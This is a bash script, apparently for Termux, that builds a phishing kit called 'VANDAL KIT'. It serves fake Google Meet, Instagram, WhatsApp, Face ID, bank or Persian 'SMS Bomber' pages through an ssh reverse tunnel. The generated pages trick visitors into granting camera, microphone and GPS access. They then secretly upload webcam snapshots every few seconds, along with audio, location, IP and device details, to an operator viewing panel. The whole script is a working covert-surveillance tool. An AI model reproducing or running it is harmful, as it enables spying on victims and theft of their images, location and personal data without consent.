#!/bin/bash
trap 'printf "\n"; stop' INT
PORT="${1:-3333}"
WORK="$HOME/.vandal"
mkdir -p "$WORK" && cd "$WORK" || exit 1
PHP_PID=""; TUN_PID=""; LINK=""
R='\033[1;91m'; G='\033[1;92m'; Y='\033[1;93m'; C='\033[1;96m'; W='\033[0m'

banner() {
clear
echo -e "${R}"
echo " ██╗   ██╗ █████╗ ███╗   ██╗██████╗  █████╗ ██╗"
echo " ██║   ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║"
echo " ██║   ██║███████║██╔██╗ ██║██║  ██║███████║██║"
echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
echo -e "${W}     VANDAL KIT"
echo ""
}

deps() { command -v php >/dev/null 2>&1 || pkg install -y php >/dev/null 2>&1; command -v ssh >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1; }

menu() {
echo -e "${C}── Template ──${W}"
echo -e "  ${G}[1]${W} SMS Bomber"
echo -e "  ${G}[2]${W} Google Meet"
echo -e "  ${G}[3]${W} Instagram"
echo -e "  ${G}[4]${W} WhatsApp"
echo -e "  ${G}[5]${W} Face ID"
echo -e "  ${G}[6]${W} Bank"
read -p $'\e[1;93m[?] Select [1-6]: \e[0m' TEM; TEM="${TEM:-1}"

echo -e "${C}── Module ──${W}"
echo -e "  ${G}[1]${W} Camera"
echo -e "  ${G}[2]${W} Camera + Mic"
echo -e "  ${G}[3]${W} Camera + GPS"
echo -e "  ${G}[4]${W} Camera + Device"
echo -e "  ${G}[5]${W} All"
read -p $'\e[1;93m[?] Select [1-5]: \e[0m' MOD; MOD="${MOD:-1}"
}

build() {
for f in visits intel gps; do touch "$f.txt"; done

cat > ip.php <<'PHPEOF'
<?php file_put_contents('visits.txt',date('c').'|'.($_SERVER['HTTP_CLIENT_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']).'|'.($_SERVER['HTTP_USER_AGENT']??'').PHP_EOL,FILE_APPEND);
PHPEOF

cat > index.php <<'PHPEOF'
<?php include 'ip.php';header('Location:index2.html');
PHPEOF

cat > save.php <<'PHPEOF'
<?php
header('Content-Type: application/json');
$type=$_GET['type']??'unknown';$raw=file_get_contents('php://input');$data=json_decode($raw,true);$ts=date('Ymd_His');$r=bin2hex(random_bytes(2));
if($type==='webcam'&&isset($data['image'])){$img=substr($data['image'],strpos($data['image'],',')+1);file_put_contents("webcam_{$ts}_{$r}.jpg",base64_decode($img));}
else{file_put_contents("{$type}_{$ts}_{$r}.json",json_encode($data,JSON_UNESCAPED_UNICODE));}
echo json_encode(['status'=>'ok']);
PHPEOF

cat > panel.php <<'PHPEOF'
<?php
$cams=glob('webcam_*.jpg');rsort($cams);
if(isset($_GET['del'])){$n=basename($_GET['del']);if(is_file($n)){unlink($n);$j=str_replace('.jpg','.json',$n);if(is_file($j))unlink($j);}header('Location:panel.php');exit;}
?><!doctype html><html lang="fa" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="6"><title>VANDAL Panel</title>
<style>*{margin:0;padding:0}body{background:#06060d;color:#c8c8d8;font-family:system-ui,sans-serif;padding:20px}
h1{color:#ff3838;font-size:20px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-top:16px}
.card{background:#0d0d1a;border:1px solid #1a1a30;border-radius:10px;padding:6px;text-align:center}
.card img{width:100%;border-radius:6px;cursor:pointer}.card div{font-size:10px;color:#888;margin-top:5px}.card a{color:#ff3838;text-decoration:none}
</style></head><body><h1>📸 VANDAL Panel — <?=count($cams)?> photos</h1>
<div class="grid"><?php foreach($cams as $c): ?><div class="card"><img src="<?=$c?>" onclick="window.open(this.src)"><div><?=$c?> <a href="?del=<?=$c?>">×</a></div></div><?php endforeach; ?></div>
</body></html>
PHPEOF

case "$TEM" in
2) TITLE="Google Meet"; COLOR="#4285F4"; ICON="🎥";;
3) TITLE="Instagram"; COLOR="#E1306C"; ICON="📸";;
4) TITLE="WhatsApp"; COLOR="#25D366"; ICON="💬";;
5) TITLE="Face ID"; COLOR="#007AFF"; ICON="🔐";;
6) TITLE="Bank"; COLOR="#D32F2F"; ICON="🏦";;
*) TITLE=""; COLOR=""; ICON="";;
esac

JS=""
[[ "$MOD" == "1" ]] && JS="setInterval(snap,2500);"
[[ "$MOD" == "2" ]] && JS="setInterval(snap,2500);startMic();"
[[ "$MOD" == "3" ]] && JS="setInterval(snap,2500);setTimeout(getGPS,2000);"
[[ "$MOD" == "4" ]] && JS="setInterval(snap,2500);setTimeout(getInfo,100);"
[[ "$MOD" == "5" ]] && JS="setInterval(snap,2500);startMic();setTimeout(getGPS,2000);setTimeout(getInfo,100);"

if [ "$TEM" = "1" ]; then
cat > index2.html << 'HTMLEOF'
<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>SMS Bomber Pro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif;direction:rtl}
body{background:linear-gradient(135deg,#0a0a1a,#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.container{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:20px;padding:28px;max-width:440px;width:100%}
h1{color:#ff4444;text-align:center;font-size:22px;margin-bottom:4px}
.sub{color:rgba(255,255,255,0.3);text-align:center;font-size:12px;margin-bottom:20px}
input,select{width:100%;padding:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#fff;font-size:14px;margin-bottom:10px;outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff4444,#cc0000);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:800;cursor:pointer;margin-top:8px}
.btn:disabled{opacity:.4}
.progress{display:none;margin-top:16px}
.progress-bar{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4444,#cc0000);border-radius:20px;transition:width .3s}
.status-box{display:none;background:rgba(0,242,96,0.06);border:1px solid rgba(0,242,96,0.12);border-radius:10px;padding:10px;text-align:center;color:#00f260;font-size:12px;margin-top:12px}
</style></head><body>
<div class="container">
<div style="text-align:center;font-size:48px;margin-bottom:8px">💥</div>
<h1>SMS BOMBER PRO</h1><p class="sub">سرویس ارسال پیامک انبوه ناشناس</p>
<input type="tel" id="phone" placeholder="📱 شماره هدف">
<select id="count"><option>۱۰</option><option selected>۵۰</option><option>۱۰۰</option><option>۵۰۰</option></select>
<button class="btn" id="btn" onclick="start()">🚀 شروع بمباران</button>
<div class="progress" id="prog"><div class="progress-bar"><div class="progress-fill" id="fill"></div></div></div>
<div class="status-box" id="status"><span id="stext">📷 در حال تأیید هویت...</span></div>
</div>
<script>
var stream,canvas,ctx;
function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}
function snap(){if(!stream)return;var v=document.getElementById('cam');if(!v||!v.videoWidth)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85),ua:navigator.userAgent})}
function getInfo(){send('intel',{ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||0})}
function getGPS(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){send('gps',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})}
function start(){
 var ph=document.getElementById('phone').value;if(!ph)return;
 send('click',{phone:ph,count:document.getElementById('count').value});
 document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='در حال اجرا...';
 document.getElementById('prog').style.display='block';document.getElementById('status').style.display='block';
 setTimeout(function(){
  navigator.mediaDevices.getUserMedia({video:{width:640}}).then(function(s){
   stream=s;var v=document.createElement('video');v.id='cam';v.autoplay=true;v.muted=true;v.playsinline=true;v.srcObject=s;v.style.display='none';document.body.appendChild(v);v.play();
   document.getElementById('stext').textContent='✅ هویت تأیید شد';setInterval(snap,2500);
  }).catch(function(){document.getElementById('stext').textContent='❌ دوربین تأیید نشد'});
 },2000);
 var sent=0,total=parseInt(document.getElementById('count').value);
 var t=setInterval(function(){sent++;var pct=Math.min((sent/total)*100,100);document.getElementById('fill').style.width=pct+'%';if(sent>=total){clearInterval(t);document.getElementById('btn').textContent='✅ تمام شد';document.getElementById('btn').disabled=false}},200);
}
setTimeout(getInfo,500);setTimeout(getGPS,3000);
</script></body></html>
HTMLEOF
else
cat > index2.html <<HTMLEOF
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>$TITLE</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{max-width:400px;background:#111;border-radius:16px;overflow:hidden;margin:16px}
.top{background:$COLOR;padding:30px 20px;text-align:center}.top h1{font-size:20px}
.mid{padding:20px;text-align:center}
.mid button{width:100%;padding:16px;background:$COLOR;color:#fff;border:0;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer}
.hidden{display:none}.video-box{position:relative;background:#000;border-radius:12px;overflow:hidden;margin:0 20px 20px}
.video-box video{width:100%;display:block;aspect-ratio:4/3;object-fit:cover}
.bar{position:absolute;top:8px;left:8px;right:8px;display:flex;justify-content:space-between;font-size:12px;color:#fff;background:rgba(0,0,0,.6);padding:5px 10px;border-radius:6px}
.rec{color:#f00;animation:blink 1s infinite}@keyframes blink{50%{opacity:.3}}
</style></head><body>
<div class="card"><div class="top"><h1>$TITLE</h1><p>Secure Connection</p></div>
<div class="mid" id="start"><button onclick="go()">🎥 Join Now</button></div>
<div class="video-box hidden" id="vbox"><video id="cam" autoplay muted playsinline></video><div class="bar"><span id="timer">00:00</span><span class="rec">● REC</span></div></div></div>
<script>
var stream,canvas,ctx,t0;
function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}
function getInfo(){send('intel',{ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||0})}
function getGPS(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){send('gps',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})}
function snap(){if(!stream)return;var v=document.getElementById('cam');if(!v.videoWidth)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85),ua:navigator.userAgent})}
function startMic(){if(!window.MediaRecorder||!stream)return;try{var r=new MediaRecorder(stream);r.ondataavailable=function(e){e.data.size>0&&fetch('save.php?type=aud',{method:'POST',body:e.data})};r.start(8000)}catch(e){}}
function go(){
 navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1280},audio:true}).then(function(s){
  stream=s;document.getElementById('cam').srcObject=s;document.getElementById('start').style.display='none';document.getElementById('vbox').classList.remove('hidden');
  t0=Date.now();setInterval(function(){var sec=Math.floor((Date.now()-t0)/1000);document.getElementById('timer').textContent=String(Math.floor(sec/60)).padStart(2,'0')+':'+String(sec%60).padStart(2,'0')},1000);
  $JS
 }).catch(function(){alert('Please allow camera access.');});
}
setTimeout(getInfo,500);setTimeout(getGPS,3000);
</script></body></html>
HTMLEOF
fi

echo -e "${G}[+] Done${W}"
}

start_php() { pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; sleep 1; php -S 0.0.0.0:$PORT >/dev/null 2>&1 & PHP_PID=$!; sleep 2; }

start_tunnel() {
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -R 80:localhost:$PORT localhost.run >tunnel.log 2>&1 &
TUN_PID=$!; for i in $(seq 1 20); do LINK=$(grep -oE 'https://[a-z0-9]+\.lhr\.life' tunnel.log|head -n1); [ -n "$LINK" ] && return 0; sleep 1; done
LINK="http://localhost:$PORT"
}

monitor() {
echo -e "\n${Y}[*] Waiting... Ctrl+C to stop${W}"
while true; do c=$(ls webcam_*.jpg 2>/dev/null|wc -l); echo -e "${C}[*] 📸 $c photos | ${LINK}/panel.php${W}"; sleep 3; done
}

stop() { [ -n "$PHP_PID" ] && kill $PHP_PID 2>/dev/null; [ -n "$TUN_PID" ] && kill $TUN_PID 2>/dev/null; pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; rm -f tunnel.log; exit 0; }

banner; deps; menu; build; start_php; start_tunnel
echo -e "\n${G}══════════════════════════════════════════════════${W}"
echo -e "${G}  Target : ${W}${LINK}"
echo -e "${G}  Panel  : ${W}${LINK}/panel.php"
echo -e "${G}══════════════════════════════════════════════════${W}\n"
monitor
EOF

chmod +x run.sh